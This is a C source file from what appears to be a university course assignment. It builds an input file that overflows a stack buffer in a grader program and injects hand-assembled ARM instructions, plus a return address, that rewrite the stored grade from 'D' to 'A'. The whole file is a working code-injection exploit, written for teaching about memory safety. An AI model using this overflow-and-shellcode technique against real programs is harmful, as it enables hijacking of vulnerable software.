/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Jonah Johnson, Jeffrey Xu                                  */
/*--------------------------------------------------------------------*/
/*
  Produces a file called dataA with the student name, a nullbyte, 
  padding to overrun the stack, with the assembly code to overwrite
  the 'D' in data with an 'A', which causes the grade to be returned
  to be an A
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"


/* Writes a file 'dataA' to influence the grader program's behavior and
   get a A. No command-line arguments, stdin reads, or stdout/stderr 
   writes. 
*/

int main(void)
{
    char* name = "Jonahjeff";

    int i;
    unsigned long ulAddr;
    unsigned int movInstr;
    unsigned int adrInstr;
    unsigned int strbInstr;
    unsigned int bInstr;
    
    /* open a file that will be written to in write binary mode */
    FILE *f = fopen("dataA", "w");

    /* return error if file can't be opened */
    if (!f) return 1; 

    /* write student name and nullbyte to file */
    fwrite(name, 1, 9, f);
    fputc('\0', f);

    /* writes padding to overrun the stack */
    for (i = 0; i < 22; i++) {
        fputc('0', f);
    }
    /* writes the instructions to the file */
    movInstr = MiniAssembler_mov(0, 'A');
    fwrite(&movInstr, sizeof(unsigned int), 1, f);
    adrInstr = MiniAssembler_adr(1, 0x420044, 0x42007c);
    fwrite(&adrInstr, sizeof(unsigned int), 1, f);
    strbInstr = MiniAssembler_strb(0, 1);
    fwrite(&strbInstr, sizeof(unsigned int), 1, f);
    bInstr = MiniAssembler_b(0x40089c, 0x420084);
    fwrite(&bInstr, sizeof(unsigned int), 1, f);

    
    /* writes address of instruction in main to get an A; see memmap */
    ulAddr = 0x420078;
    fwrite(&ulAddr, sizeof(unsigned long), 1, f);

    fclose(f);

    /* return success */
    return 0;
}